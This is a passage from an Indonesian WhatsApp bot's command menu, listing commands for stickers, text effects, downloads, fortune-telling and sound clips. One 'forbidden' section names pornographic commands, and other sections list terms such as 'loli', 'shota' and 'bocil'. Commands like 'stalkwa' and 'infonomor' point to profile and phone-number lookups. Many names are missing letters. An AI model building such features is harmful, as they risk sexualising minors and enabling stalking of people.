┆❐ ${prefix}antiwame ⟨ Pencegah Link wa-me ⟩
┆❐ ${prefix}antilinkyt ⟨ Pencegah Link YouTube ⟩
┆❐ ${prefix}antilinkchannel ⟨ Pencegah Link Channel ⟩
┆❐ ${prefix}antilinkall ⟨ Pencegah Semua Link - Medsos ⟩
┆❐ ${prefix}antilink ⟨ Pencegah Link Grup ⟩
┆❐ ${prefix}antilinktwt ⟨ Pencegah Link Twitter ⟩
┆❐ ${prefix}antilinktt ⟨ Pencegah Link TikTok ⟩
┆❐ ${prefix}antilinktg ⟨ Pencegah Link Telegram ⟩
┆❐ ${prefix}antilinkfb ⟨ Pencegah Link Facebook ⟩
┆❐ ${prefix}antilinkig ⟨ Pencegah Link Instagram ⟩
┆❐ ${prefix}antivirtex ⟨ Pencegah Virtex ⟩
┆❐ ${prefix}antipromosi ⟨ Pencegah Promosi Panel ⟩
╰────────────◇

╭✄┈┈┈⟬ *Oᴘᴇɴ - AI* ⟭
┆❐ ${prefix}ai
┆❐ ${prefix}openai
┆❐ ${prefix}ai-img
┆❐ ${prefix}aigambar
┆❐ ${prefix}simi ⟨ Alternatif Open-AI ⟩
╰────────────◇

╭✄┈┈┈⟬ *Cᴏɴᴠᴇʀᴛᴇʀ Mᴇɴᴜ* ⟭
┆❐ ${prefix}toimg
┆❐ ${prefix}tourl ⟨ Balas Gambarnya ⟩
┆❐ ${prefix}tohd ⟨ Enhance Foto ⟩
┆❐ ${prefix}tomp3
┆❐ ${prefix}tomp4
┆❐ ${prefix}tovn
┆❐ ${prefix}togif
┆❐ ${prefix}jadianime
┆❐ ${prefix}findmusic ⟨ Mengidentifikasi Nama Musik ⟩
╰────────────◇

╭✄┈┈┈⟬ *Fɪᴛᴜʀ Lᴀɪɴɴʏᴀ* ⟭
┆❐ ${prefix}qcimg ⟨ Quick Chat Versi Gambar ⟩
┆❐ ${prefix}anonymous ⟨ Chat Random ⟩
┆❐ ${prefix}mulai ⟨ Memulai Chatan Anonymous ⟩
┆❐ ${prefix}lanjut ⟨ Mencari Partner Lain ⟩
┆❐ ${prefix}keluar ⟨ Meninggalkan Chat Anonymous ⟩
┆❐ ${prefix}cekapiz ⟨ Cek Api ZenZapis ⟩
┆❐ ${prefix}cekapilol ⟨ Cek Api Lolhuman ⟩
┆❐ ${prefix}quotesanime ⟨ Kata Kata Anime ⟩
┆❐ ${prefix}lirik ⟨ Nama Musik ⟩
┆❐ ${prefix}pcouple ⟨ Foto Pasangan ⟩
┆❐ ${prefix}wm ⟨ Ganti Nama Pencipta Stiker ⟩
┆❐ ${prefix}rmbg ⟨ Hapus Latar Belakang Foto ⟩
┆❐ ${prefix}qr ⟨ Pembutan Teks > Kode QR ⟩
┆❐ ${prefix}jadian ⟨ Jadian Random ⟩
┆❐ ${prefix}menfess ⟨ Pesan Cepat + Anonim ⟩
┆❐ ${prefix}join ⟨ Join Bot Ke Grupmu ⟩
┆❐ ${prefix}wallpaper ⟨ Pencarian Wallpaper ⟩
┆❐ ${prefix}wikimedia
┆❐ ${prefix}bisakah
┆❐ ${prefix}apakah
┆❐ ${prefix}stalkwa ⟨ Melihat Profile Lengkap ⟩
┆❐ ${prefix}bagaimanakah
┆❐ ${prefix}ceksange
┆❐ ${prefix}cekgay
┆❐ ${prefix}ceklesbi
┆❐ ${prefix}neon
┆❐ ${prefix}tspeed ⟨ Speed Test Bot ⟩
┆❐ ${prefix}emoji ⟨ Opsi Emoji ⟩
┆❐ ${prefix}heleh
┆❐ ${prefix}infonomor
┆❐ ${prefix}halah
┆❐ ${prefix}kapan
┆❐ ${prefix}jalantikus-meme
┆❐ ${prefix}merdeka-news
┆❐ ${prefix}antara-news
┆❐ ${prefix}tempo-news
┆❐ ${prefix}kontan-news
┆❐ ${prefix}sindo-news
┆❐ ${prefix}okezone-news
┆❐ ${prefix}daily-news
┆❐ ${prefix}detik-news
┆❐ ${prefix}inews-news
┆❐ ${prefix}kompas-news
┆❐ ${prefix}indozone-news
┆❐ ${prefix}tribun-news
┆❐ ${prefix}cnbc-news
┆❐ ${prefix}tvsearch
┆❐ ${prefix}cnn-news
┆❐ ${prefix}fajar-news
┆❐ ${prefix}darkjoke
┆❐ ${prefix}quotes
┆❐ ${prefix}sertifikatpacar
┆❐ ${prefix}sertifikattolol
┆❐ ${prefix}sertifikatbucin
┆❐ ${prefix}wangy
┆❐ ${prefix}ringtone ⟨ Nada Dering ⟩
┆❐ ${prefix}tinyurl
┆❐ ${prefix}bitly
┆❐ ${prefix}cuttly
┆❐ ${prefix}ssweb ⟨ Screenshot Website ⟩
┆❐ ${prefix}cekmati ⟨ Cek Kapan Kamu Wafat ⟩
┆❐ ${prefix}dilanquote
┆❐ ${prefix}totalf ⟨ Total Fitur Bot ⟩
┆❐ ${prefix}nulis ⟨ Nulis By Bot ⟩
┆❐ ${prefix}google ⟨ Pencarian By Google ⟩
┆❐ ${prefix}cuaca ⟨ Prediksi Cuaca ⟩
┆❐ ${prefix}katasenja
┆❐ ${prefix}cekcantik
┆❐ ${prefix}cekganteng
┆❐ ${prefix}gitclone ⟨ Download File GIT ⟩
┆❐ ${prefix}randomquote
┆❐ ${prefix}rules ⟨ Aturan Penggunaan Bot ⟩
┆❐ ${prefix}dbinary ⟨ Decode ⟩
┆❐ ${prefix}ebinary ⟨ Encode ⟩
┆❐ ${prefix}enc ⟨ Enkripsi Script/Teks Penting ⟩
┆❐ ${prefix}del ⟨ Hapus Pesan Dari Bot ⟩
┆❐ ${prefix}muslimquote
┆❐ ${prefix}galauquote
┆❐ ${prefix}kanyequote
┆❐ ${prefix}trumpquote
┆❐ ${prefix}trumpthink
┆❐ ${prefix}creepyfact
┆❐ ${prefix}faktaunik
┆❐ ${prefix}remini ⟨ Enhance Foto ⟩
┆❐ ${prefix}galau
┆❐ ${prefix}bucin
┆❐ ${prefix}puisi
┆❐ ${prefix}pantun
┆❐ ${prefix}motivasi ⟨ Motivasi Hidup ⟩
┆❐ ${prefix}tts ⟨ Ubah Teks Menjadi Suara ⟩
╰────────────◇

╭✄┈┈┈⟬ *Vᴏɪᴄᴇ Cʜᴀɴɢᴇʀ* ⟭
┆❐ ${prefix}bass
┆❐ ${prefix}blown
┆❐ ${prefix}deep
┆❐ ${prefix}earrape
┆❐ ${prefix}fast
┆❐ ${prefix}laki-laki ⟨ Suara Laki-Laki ⟩
┆❐ ${prefix}perempuan ⟨ Suara Perempuan ⟩
┆❐ ${prefix}fat
┆❐ ${prefix}nightcore
┆❐ ${prefix}remix
┆❐ ${prefix}reverse
┆❐ ${prefix}robot
┆❐ ${prefix}slow
┆❐ ${prefix}smooth
┆❐ ${prefix}tupai
╰────────────◇

╭✄┈┈┈⟬ *Aɴɪᴍᴇ Mᴇɴᴜ* ⟭
┆❐ ${prefix}akira
┆❐ ${prefix}akiyama
┆❐ ${prefix}ana
┆❐ ${prefix}asuna
┆❐ ${prefix}ayuzawa
┆❐ ${prefix}boruto
┆❐ ${prefix}chitoge
┆❐ ${prefix}deidara
┆❐ ${prefix}doraemon
┆❐ ${prefix}elaina
┆❐ ${prefix}emilia
┆❐ ${prefix}erza
┆❐ ${prefix}gremory
┆❐ ${prefix}hestia
┆❐ ${prefix}hinata
┆❐ ${prefix}inori
┆❐ ${prefix}isuzu
┆❐ ${prefix}itachi
┆❐ ${prefix}itori
┆❐ ${prefix}kaga
┆❐ ${prefix}kagura
┆❐ ${prefix}kakasih
┆❐ ${prefix}kaori
┆❐ ${prefix}keneki
┆❐ ${prefix}kotori
┆❐ ${prefix}kurumi
┆❐ ${prefix}loli
┆❐ ${prefix}madara
┆❐ ${prefix}mikasa
┆❐ ${prefix}miku
┆❐ ${prefix}minato
┆❐ ${prefix}naruto
┆❐ ${prefix}nezuko
┆❐ ${prefix}onepiece
┆❐ ${prefix}pokemon
┆❐ ${prefix}rize
┆❐ ${prefix}sagiri
┆❐ ${prefix}sakura
┆❐ ${prefix}sasuke
┆❐ ${prefix}shina
┆❐ ${prefix}shinka
┆❐ ${prefix}shizuka
┆❐ ${prefix}shota
┆❐ ${prefix}toukachan
┆❐ ${prefix}tsunade
┆❐ ${prefix}yuki 
╰────────────◇

╭✄┈┈┈⟬ *Dᴏᴡɴʟᴏᴀᴅ Mᴇɴᴜ* ⟭
┆❐ ${prefix}mp3 ⟨ Metode Audio ⟩
┆❐ ${prefix}mp4 ⟨ Metode Video ⟩
┆❐ ${prefix}play
┆❐ ${prefix}playmp3
┆❐ ${prefix}playmp4
┆❐ ${prefix}ytsearch
┆❐ ${prefix}tiktok ⟨ Tanpa Watermark ⟩
┆❐ ${prefix}tiktokaudio ⟨ Audio ⟩
┆❐ ${prefix}fbdl
┆❐ ${prefix}igdl
┆❐ ${prefix}twtdl
┆❐ ${prefix}pinterest
┆❐ ${prefix}mediafire
╰────────────◇

╭✄┈┈┈⟬ *Mᴀᴋᴇʀ Mᴇɴᴜ* ⟭
┆❐ ${prefix}anonymous2
┆❐ ${prefix}astronotspace
┆❐ ${prefix}avatar3q360
┆❐ ${prefix}avatarff
┆❐ ${prefix}avatarleagueofking
┆❐ ${prefix}avatarlolbyname
┆❐ ${prefix}avataroverwatch
┆❐ ${prefix}bannerofaov
┆❐ ${prefix}bannerofaov2
┆❐ ${prefix}bannerofapex
┆❐ ${prefix}banneroffreefire
┆❐ ${prefix}banneroflol
┆❐ ${prefix}bannerofoverwatch
┆❐ ${prefix}bannerofpubg
┆❐ ${prefix}bannerytcsgo
┆❐ ${prefix}beautifulgalaxylol
┆❐ ${prefix}beautifulshimmering
┆❐ ${prefix}blueneon
┆❐ ${prefix}circlemarcotteam
┆❐ ${prefix}colorfulpubg
┆❐ ${prefix}companylogo
┆❐ ${prefix}companylogo2
┆❐ ${prefix}coverbannerlol
┆❐ ${prefix}coverdota2
┆❐ ${prefix}coverfblol
┆❐ ${prefix}coverfreefirefb
┆❐ ${prefix}coverleagueofking
┆❐ ${prefix}coverloknew
┆❐ ${prefix}coverofwarface
┆❐ ${prefix}coveronepiecefb
┆❐ ${prefix}rossfirecover
┆❐ ${prefix}rossfirestyle
┆❐ ${prefix}sgocover
┆❐ ${prefix}utegirlgamer
┆❐ ${prefix}yberhunterfb
┆❐ ${prefix}dragonballfb
┆❐ ${prefix}effect3donbeach
┆❐ ${prefix}elegantrotation
┆❐ ${prefix}fbgamepubgcover
┆❐ ${prefix}footballteam
┆❐ ${prefix}gaminglogo4fvs
┆❐ ${prefix}gamingmascot
┆❐ ${prefix}gradientlogo
┆❐ ${prefix}gunlogogaming
┆❐ ${prefix}introvideomaker
┆❐ ${prefix}letterlogos 
┆❐ ${prefix}logoaccording 
┆❐ ${prefix}logogamingassasin 
┆❐ ${prefix}lolcoverbyname 
┆❐ ${prefix}lolpentakill 
┆❐ ${prefix}lolwallpaper 
┆❐ ${prefix}maketeamlogo 
┆❐ ${prefix}mascotstyle 
┆❐ ${prefix}metalmascot 
┆❐ ${prefix}newlolavatar 
┆❐ ${prefix}overwatchcover 
┆❐ ${prefix}overwatchwallpaper 
┆❐ ${prefix}pencilsketch 
┆❐ ${prefix}pubgcutelogo 
┆❐ ${prefix}pubglogomaker 
┆❐ ${prefix}anjing
┆❐ ${prefix}pokemon
┆❐ ${prefix}rovwallpaper 
┆❐ ${prefix}rovwallpaperhd 
┆❐ ${prefix}teamlogo 
┆❐ ${prefix}wallpaperaov 
┆❐ ${prefix}kucing
┆❐ ${prefix}wallpaperml 
┆❐ ${prefix}wallas ⟨ Asthetic ⟩
╰────────────◇

╭✄┈┈┈⟬ *Sᴛɪᴄᴋᴇʀ Mᴇɴᴜ* ⟭
┆❐ ${prefix}qc ⟨ Quick Chat Versi Stiker ⟩
┆❐ ${prefix}emoji ⟨ Opsi Emoji ⟩
┆❐ ${prefix}sticker
┆❐ ${prefix}emojimix
┆❐ ${prefix}emojimix2
┆❐ ${prefix}ipmoji ⟨ Emoji iPhone ⟩
┆❐ ${prefix}gomoji ⟨ Emoji Google ⟩
┆❐ ${prefix}sammoji ⟨ Emoji Samsung ⟩
┆❐ ${prefix}micmoji ⟨ Emoji Microsoft ⟩
┆❐ ${prefix}wamoji ⟨ Emoji WhatsApp ⟩
┆❐ ${prefix}twitmoji ⟨ Emoji Twitter ⟩
┆❐ ${prefix}skmoji ⟨ Emoji Skype ⟩
┆❐ ${prefix}fbmoji ⟨ Emoji Facebook ⟩
┆❐ ${prefix}joymoji ⟨ Emoji Joy ⟩
┆❐ ${prefix}mojimoji ⟨ Emoji Moji ⟩
┆❐ ${prefix}pedmoji ⟨ Emoji Pedia ⟩
┆❐ ${prefix}igmoji ⟨ Emoji Instagram ⟩
┆❐ ${prefix}htcmoji ⟨ Emoji HTC ⟩
┆❐ ${prefix}mozmoji ⟨ Emoji Mozilla ⟩
┆❐ ${prefix}softmoji ⟨ Emoji SoftBank ⟩
┆❐ ${prefix}docmoji ⟨ Emoji Docomo ⟩
┆❐ ${prefix}kddmoji ⟨ Emoji KDDI ⟩
┆❐ ${prefix}smeme
┆❐ ${prefix}stickerpin ⟨ Stiker Pinterest ⟩
┆❐ ${prefix}sgif
┆❐ ${prefix}amongus
┆❐ ${prefix}chat
┆❐ ${prefix}attp ⟨ Dengan GIF ⟩
┆❐ ${prefix}ttp ⟨ Tanpa GIF ⟩
┆❐ ${prefix}anime
┆❐ ${prefix}animegif
┆❐ ${prefix}sbucin
┆❐ ${prefix}rabbit
┆❐ ${prefix}dadu
┆❐ ${prefix}pentol
┆❐ ${prefix}gura
┆❐ ${prefix}mukalu
┆❐ ${prefix}patrickgif
┆❐ ${prefix}paimon
┆❐ ${prefix}random
┆❐ ${prefix}patrick
┆❐ ${prefix}popoci
┆❐ ${prefix}sponsbob
┆❐ ${prefix}kawan-sponsbob
┆❐ ${prefix}awoawo
┆❐ ${prefix}hat
┆❐ ${prefix}benedict
┆❐ ${prefix}dbfly
┆❐ ${prefix}dino-kuning
┆❐ ${prefix}doge
┆❐ ${prefix}gojosatoru
┆❐ ${prefix}hope-boy
┆❐ ${prefix}jisoo
┆❐ ${prefix}kr-robot
┆❐ ${prefix}lonte
┆❐ ${prefix}manusia-lidi
┆❐ ${prefix}menjamet
┆❐ ${prefix}meow
┆❐ ${prefix}nicholas
┆❐ ${prefix}tyni
╰────────────◇

╭✄┈┈┈⟬ *Cᴇᴄᴀɴ Mᴇɴᴜ* ⟭
┆❐ ${prefix}cecan
┆❐ ${prefix}cecan2
┆❐ ${prefix}china
┆❐ ${prefix}cogan
┆❐ ${prefix}indonesia
┆❐ ${prefix}japan
┆❐ ${prefix}korea
┆❐ ${prefix}malaysia
┆❐ ${prefix}thailand
┆❐ ${prefix}vietnam
╰────────────◇

╭✄┈┈┈⟬ *Tᴇxᴛ Pʀᴏ* ⟭
┆❐ ${prefix}3dbox
┆❐ ${prefix}3dchrome
┆❐ ${prefix}3dglue
┆❐ ${prefix}3dstone
┆❐ ${prefix}abstra
┆❐ ${prefix}advanced
┆❐ ${prefix}bear
┆❐ ${prefix}berry
┆❐ ${prefix}biscuit
┆❐ ${prefix}black-metal
┆❐ ${prefix}blackpink
┆❐ ${prefix}blood
┆❐ ${prefix}blood2
┆❐ ${prefix}blue-balloon
┆❐ ${prefix}blue-gem
┆❐ ${prefix}blue-glass
┆❐ ${prefix}blue-glitter
┆❐ ${prefix}blue-jewelry
┆❐ ${prefix}blue-metal
┆❐ ${prefix}blue-sparkling
┆❐ ${prefix}bokeh
┆❐ ${prefix}bread
┆❐ ${prefix}broken
┆❐ ${prefix}bronze-glitter
┆❐ ${prefix}andy
┆❐ ${prefix}aptain-as2
┆❐ ${prefix}arbon
┆❐ ${prefix}hocolate
┆❐ ${prefix}hrismast
┆❐ ${prefix}hristmas
┆❐ ${prefix}loudsky
┆❐ ${prefix}yan-balloon
┆❐ ${prefix}yan-glass
┆❐ ${prefix}yan-jewelry
┆❐ ${prefix}yan-sparkling
┆❐ ${prefix}dark-gold
┆❐ ${prefix}decorate
┆❐ ${prefix}decorate-purple
┆❐ ${prefix}decorative
┆❐ ${prefix}deluxe-gold
┆❐ ${prefix}demon
┆❐ ${prefix}denim
┆❐ ${prefix}discovery
┆❐ ${prefix}dropwater
┆❐ ${prefix}drug
┆❐ ${prefix}embossed
┆❐ ${prefix}engraved
┆❐ ${prefix}equalizer
┆❐ ${prefix}eroded-metal
┆❐ ${prefix}fabric
┆❐ ${prefix}fiction
┆❐ ${prefix}firework
┆❐ ${prefix}glitch
┆❐ ${prefix}gloss
┆❐ ${prefix}glossy
┆❐ ${prefix}glossy-blue
┆❐ ${prefix}glossy-carbon
┆❐ ${prefix}gold-balloon
┆❐ ${prefix}gold-glitter
┆❐ ${prefix}gold-sparkling
┆❐ ${prefix}golden
┆❐ ${prefix}gradient
┆❐ ${prefix}gradient2
┆❐ ${prefix}green-balloon
┆❐ ${prefix}green-glass
┆❐ ${prefix}green-glitter
┆❐ ${prefix}green-jewelry
┆❐ ${prefix}green-neon
┆❐ ${prefix}green-sparkling
┆❐ ${prefix}halloween
┆❐ ${prefix}halloween2
┆❐ ${prefix}holographic
┆❐ ${prefix}honey2
┆❐ ${prefix}hot-metal
┆❐ ${prefix}ice
┆❐ ${prefix}joker
┆❐ ${prefix}juice
┆❐ ${prefix}koifish
┆❐ ${prefix}luxury2
┆❐ ${prefix}magma
┆❐ ${prefix}marble
┆❐ ${prefix}marble2
┆❐ ${prefix}matrix
┆❐ ${prefix}metal-silver
┆❐ ${prefix}metaldark
┆❐ ${prefix}metallic2
┆❐ ${prefix}minion
┆❐ ${prefix}multicolor
┆❐ ${prefix}natural
┆❐ ${prefix}neon
┆❐ ${prefix}neon-devil
┆❐ ${prefix}neon-light
┆❐ ${prefix}neon2
┆❐ ${prefix}neonc
┆❐ ${prefix}neonlight
┆❐ ${prefix}neonligth2
┆❐ ${prefix}newyear
┆❐ ${prefix}newyear2
┆❐ ${prefix}orange-glass
┆❐ ${prefix}orange-jewelry
┆❐ ${prefix}oscar
┆❐ ${prefix}papercut
┆❐ ${prefix}peridot
┆❐ ${prefix}pink-balloon
┆❐ ${prefix}pink-glitter
┆❐ ${prefix}pink-sparkling
┆❐ ${prefix}purple
┆❐ ${prefix}purple-balloon
┆❐ ${prefix}purple-gem
┆❐ ${prefix}purple-glass
┆❐ ${prefix}purple-glitter
┆❐ ${prefix}purple-jewelry
┆❐ ${prefix}purple-shiny-glass
┆❐ ${prefix}purple-sparkling
┆❐ ${prefix}rainbow2
┆❐ ${prefix}red-balloon
┆❐ ${prefix}red-glass
┆❐ ${prefix}red-jewelry
┆❐ ${prefix}red-sparkling
┆❐ ${prefix}road-warning
┆❐ ${prefix}teknologi
┆❐ ${prefix}rock
┆❐ ${prefix}rusty
┆❐ ${prefix}scifi
┆❐ ${prefix}shiny
┆❐ ${prefix}silver-glitter
┆❐ ${prefix}silver-jewelry
┆❐ ${prefix}sircuit
┆❐ ${prefix}skeleton
┆❐ ${prefix}sketch
┆❐ ${prefix}snow
┆❐ ${prefix}steel
┆❐ ${prefix}strawberry
┆❐ ${prefix}summer
┆❐ ${prefix}summery
┆❐ ${prefix}thunder
┆❐ ${prefix}thunder2
┆❐ ${prefix}toxic
┆❐ ${prefix}transformer
┆❐ ${prefix}underwater
┆❐ ${prefix}wall
┆❐ ${prefix}water-pipe
┆❐ ${prefix}watercolor
┆❐ ${prefix}wicker
┆❐ ${prefix}wonderful-graffiti
┆❐ ${prefix}wood
┆❐ ${prefix}writing
┆❐ ${prefix}xmas
┆❐ ${prefix}yellow-glass
┆❐ ${prefix}yellow-jewelry
╰────────────◇

╭✄┈┈┈⟬ *Mᴜsʟɪᴍ Mᴇɴᴜ* ⟭
┆❐ ${prefix}asmaulhusna
┆❐ ${prefix}kisahnabi
┆❐ ${prefix}jadwalshalat
┆❐ ${prefix}randomquran
┆❐ ${prefix}randomquran2
┆❐ ${prefix}dictator
┆❐ ${prefix}listsurah
┆❐ ${prefix}tafsirsurah
┆❐ ${prefix}alquranaudio
╰────────────◇

╭✄┈┈┈⟬ *PʜᴏᴛᴏOxʏ Mᴇɴᴜ* ⟭
┆❐ ${prefix}typography-flower
┆❐ ${prefix}under-flower
┆❐ ${prefix}bevel-text
┆❐ ${prefix}silk-text
┆❐ ${prefix}sweet-andy
┆❐ ${prefix}smoke-typography
┆❐ ${prefix}arvedwood
┆❐ ${prefix}scary-cemetery
┆❐ ${prefix}royallook
┆❐ ${prefix}coffeecup2
┆❐ ${prefix}illuminated
┆❐ ${prefix}harry-potter2
┆❐ ${prefix}birthday-cake
┆❐ ${prefix}embroidery
┆❐ ${prefix}flaming
┆❐ ${prefix}furtext
┆❐ ${prefix}nightsky
┆❐ ${prefix}glow-rainbow
┆❐ ${prefix}gradient-avatar
┆❐ ${prefix}white-cube
┆❐ ${prefix}graffiti-cover
┆❐ ${prefix}rainbow-shine
┆❐ ${prefix}smoky-neon
┆❐ ${prefix}quotes-underfall
┆❐ ${prefix}vector-nature
┆❐ ${prefix}yellow-rose
┆❐ ${prefix}love-text
┆❐ ${prefix}underwater-ocean
┆❐ ${prefix}nature-text
┆❐ ${prefix}wolf-metal
┆❐ ${prefix}summer-text
┆❐ ${prefix}wooden-board
┆❐ ${prefix}quote-wood
┆❐ ${prefix}love-text
┆❐ ${prefix}quotes-undergrass
┆❐ ${prefix}naruto-banner
┆❐ ${prefix}love-message
┆❐ ${prefix}textoncup2
┆❐ ${prefix}burn-paper
┆❐ ${prefix}smoke
┆❐ ${prefix}romantic-messages
┆❐ ${prefix}shadow-sky
┆❐ ${prefix}text-cup
┆❐ ${prefix}coffecup
┆❐ ${prefix}battlegrounds-logo
┆❐ ${prefix}battlefield4
┆❐ ${prefix}text-8bit
╰────────────◇

╭✄┈┈┈⟬ *Eᴘʜᴏᴛᴏ Mᴇɴᴜ* ⟭
┆❐ ${prefix}andy
┆❐ ${prefix}hristmas
┆❐ ${prefix}3dchristmas
┆❐ ${prefix}sparklechristmas
┆❐ ${prefix}holographic':
┆❐ ${prefix}deepsea
┆❐ ${prefix}scifi
┆❐ ${prefix}rainbow
┆❐ ${prefix}waterpipe
┆❐ ${prefix}spooky
┆❐ ${prefix}karbon
┆❐ ${prefix}neonlight2
┆❐ ${prefix}pencil
┆❐ ${prefix}ircuit
┆❐ ${prefix}discovery
┆❐ ${prefix}metalic
┆❐ ${prefix}fiction
┆❐ ${prefix}demon
┆❐ ${prefix}3dbox
┆❐ ${prefix}transformer
┆❐ ${prefix}berry
┆❐ ${prefix}thunder
┆❐ ${prefix}magma
┆❐ ${prefix}3dstone
┆❐ ${prefix}greenneon
┆❐ ${prefix}neonlight
┆❐ ${prefix}glitch
┆❐ ${prefix}harrypotter
┆❐ ${prefix}brokenglass
┆❐ ${prefix}papercut
┆❐ ${prefix}lion2
┆❐ ${prefix}watercolor
┆❐ ${prefix}multicolor
┆❐ ${prefix}neondevil
┆❐ ${prefix}underwater
┆❐ ${prefix}graffitibike
┆❐ ${prefix}3davengers
┆❐ ${prefix}snow
┆❐ ${prefix}cloud
┆❐ ${prefix}honey
┆❐ ${prefix}ice
┆❐ ${prefix}fruitjuice
┆❐ ${prefix}biscuit
┆❐ ${prefix}wood
┆❐ ${prefix}whitebear
┆❐ ${prefix}hocolate
┆❐ ${prefix}strawberry
┆❐ ${prefix}matrix
┆❐ ${prefix}blood
┆❐ ${prefix}dropwater
┆❐ ${prefix}toxic
┆❐ ${prefix}lava
┆❐ ${prefix}rock
┆❐ ${prefix}bloodglas
┆❐ ${prefix}hallowen
┆❐ ${prefix}darkgold
┆❐ ${prefix}joker
┆❐ ${prefix}wicker
┆❐ ${prefix}firework
┆❐ ${prefix}skeleton
┆❐ ${prefix}blackpink
┆❐ ${prefix}sand
┆❐ ${prefix}glue
┆❐ ${prefix}1917
┆❐ ${prefix}leaves
╰────────────◇

╭✄┈┈┈⟬ *Asᴜᴘᴀɴ Mᴇɴᴜ* ⟭
┆❐ ${prefix}asupan
┆❐ ${prefix}hea
┆❐ ${prefix}bocil
┆❐ ${prefix}ukhty
┆❐ ${prefix}santuy
┆❐ ${prefix}kayes
┆❐ ${prefix}rika
┆❐ ${prefix}notnot
┆❐ ${prefix}geayubi
┆❐ ${prefix}chika
┆❐ ${prefix}delvira
┆❐ ${prefix}ayu
┆❐ ${prefix}bunga
┆❐ ${prefix}aura
┆❐ ${prefix}nisa
┆❐ ${prefix}ziva
┆❐ ${prefix}yana
┆❐ ${prefix}viona
┆❐ ${prefix}syania
┆❐ ${prefix}riri
┆❐ ${prefix}syifa
┆❐ ${prefix}mama-gina
┆❐ ${prefix}alcakenya
┆❐ ${prefix}mangayutri
╰────────────◇

╭✄┈┈┈⟬ *Mᴇɴᴜ Rᴀᴍᴀʟ* ⟭
┆❐ ${prefix}nomorhoki
┆❐ ${prefix}artimimpi
┆❐ ${prefix}artinama
┆❐ ${prefix}ramaljodoh
┆❐ ${prefix}ramaljodohbali
┆❐ ${prefix}suamiistri
┆❐ ${prefix}ramalcinta
┆❐ ${prefix}cocoknama
┆❐ ${prefix}pasangan
┆❐ ${prefix}jadiannikah
┆❐ ${prefix}sifatusaha
┆❐ ${prefix}rezeki
┆❐ ${prefix}pekerjaan
┆❐ ${prefix}nasib
┆❐ ${prefix}penyakit
┆❐ ${prefix}tarot
┆❐ ${prefix}fengshui
┆❐ ${prefix}haribaik
┆❐ ${prefix}harisangar
┆❐ ${prefix}harisial
┆❐ ${prefix}nagahari
┆❐ ${prefix}arahrezeki
┆❐ ${prefix}peruntungan
┆❐ ${prefix}weton
┆❐ ${prefix}karakter
┆❐ ${prefix}keberuntungan
┆❐ ${prefix}memancing
┆❐ ${prefix}masasubur
┆❐ ${prefix}zodiak
╰────────────◇

╭✄┈┈┈⟬ *Mᴇɴᴜ Tᴇʀʟᴀʀᴀɴɢ* ⟭
┆❐ ${prefix}ahegao
┆❐ ${prefix}ass
┆❐ ${prefix}bdsm
┆❐ ${prefix}porno
┆❐ ${prefix}blowjob
┆❐ ${prefix}ukold
┆❐ ${prefix}um
┆❐ ${prefix}femdom
┆❐ ${prefix}foot
┆❐ ${prefix}gangbang
┆❐ ${prefix}gifs
┆❐ ${prefix}glasses
┆❐ ${prefix}hentai
┆❐ ${prefix}manga
┆❐ ${prefix}masturbation
┆❐ ${prefix}megumin
┆❐ ${prefix}cuddle
┆❐ ${prefix}foxgirl
┆❐ ${prefix}kemonomimi2
┆❐ ${prefix}woof
┆❐ ${prefix}holo2
┆❐ ${prefix}hug
┆❐ ${prefix}kiss
┆❐ ${prefix}lizard
┆❐ ${prefix}meowi
┆❐ ${prefix}neko2
┆❐ ${prefix}pat
┆❐ ${prefix}poke
┆❐ ${prefix}slap
┆❐ ${prefix}tickle
┆❐ ${prefix}neko
┆❐ ${prefix}nekop
┆❐ ${prefix}nekonime
┆❐ ${prefix}orgy
┆❐ ${prefix}panties
┆❐ ${prefix}tentacles
┆❐ ${prefix}thighs
┆❐ ${prefix}zettai
╰────────────◇

╭✄┈┈┈⟬ *Sᴏᴜɴᴅ Mᴇɴᴜ* ⟭
┆❐ ${prefix}sound1
┆❐ ${prefix}sound2
┆❐ ${prefix}sound3
┆❐ ${prefix}sound4
┆❐ ${prefix}sound5
┆❐ ${prefix}sound6
┆❐ ${prefix}sound7
┆❐ ${prefix}sound8
┆❐ ${prefix}sound9
┆❐ ${prefix}sound10
┆❐ ${prefix}sound11
┆❐ ${prefix}sound12
┆❐ ${prefix}sound13
┆❐ ${prefix}sound14
┆❐ ${prefix}sound15
┆❐ ${prefix}sound16
┆❐ ${prefix}sound17
┆❐ ${prefix}sound18
┆❐ ${prefix}sound19
┆❐ ${prefix}sound20
┆❐ ${prefix}sound21
┆❐ ${prefix}sound22
┆❐ ${prefix}sound23
┆❐ ${prefix}sound24
┆❐ ${prefix}sound25
┆❐ ${prefix}sound26
┆❐ ${prefix}sound27
┆❐ ${prefix}sound28
┆❐ ${prefix}sound29
┆❐ ${prefix}sound30
┆❐ ${prefix}sound31
┆❐ ${prefix}sound32
┆❐ ${prefix}sound33
┆❐ ${prefix}sound34
┆❐ ${prefix}sound35
┆❐ ${prefix}sound36
┆❐ ${prefix}sound37
┆❐ ${prefix}sound38
┆❐ ${prefix}sound39
┆❐ ${prefix}sound40
┆❐ ${prefix}sound41
┆❐ ${prefix}sound42
┆❐ ${prefix}sound43
┆❐ ${prefix}sound44
┆❐ ${prefix}sound45
┆❐ ${prefix}sound46
┆❐ ${prefix}sound47
┆❐ ${prefix}sound48
┆❐ ${prefix}sound49
┆❐ ${prefix}sound50
┆❐ ${prefix}sound51
┆❐ ${prefix}sound52
┆❐ ${prefix}sound53
┆❐ ${prefix}sound54
┆❐ ${prefix}sound55
┆❐ ${prefix}sound56
┆❐ ${prefix}sound57
┆❐ ${prefix}sound58
┆❐ ${prefix}sound59
┆❐ ${prefix}sound60
┆❐ ${prefix}sound61
┆❐ ${prefix}sound62
┆❐ ${prefix}sound63
┆❐ ${prefix}sound64
┆❐ ${prefix}sound65
┆❐ ${prefix}sound66
┆❐ ${prefix}sound67
┆❐ ${prefix}sound68
┆❐ ${prefix}sound69
┆❐ ${prefix}sound70
┆❐ ${prefix}sound71
┆❐ ${prefix}sound72
┆❐ ${prefix}sound73
┆❐ ${prefix}sound74
┆❐ ${prefix}sound75
┆❐ ${prefix}sound76
┆❐ ${prefix}sound77
┆❐ ${prefix}sound78
┆❐ ${prefix}sound79
┆❐ ${prefix}sound80
┆❐ ${prefix}sound81
┆❐ ${prefix}sound82
┆❐ ${prefix}sound83
┆❐ ${prefix}sound84
┆❐ ${prefix}sound85
┆❐ ${prefix}sound86
┆❐ ${prefix}sound87
┆❐ ${prefix}sound88
┆❐ ${prefix}sound89
┆❐ ${prefix}sound90
┆❐ ${prefix}sound91
┆❐ ${prefix}sound92
